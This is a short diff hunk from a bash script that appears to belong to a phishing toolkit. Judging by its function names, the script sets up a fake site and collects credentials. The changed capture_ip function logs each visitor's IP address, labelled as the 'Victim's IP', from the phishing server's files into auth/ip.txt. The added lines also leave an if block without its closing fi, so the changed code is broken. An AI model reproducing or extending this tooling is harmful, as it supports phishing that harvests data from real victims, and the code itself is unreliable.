@@ -271,11 +271,11 @@ setup_site() {
 ## Get IP address
 capture_ip() {
     IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
-
-    if ! grep -q "$IP" auth/ip.txt 2>/dev/null; then
-        echo -e "\nIP encontrado: $IP"
-        echo "$IP" >> auth/ip.txt
-    fi
+	
+	if ! grep -q "$IP" auth/ip.txt 2>/dev/null; then
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
+	cat .server/www/ip.txt >> auth/ip.txt
 }
 
 ## Get credentials
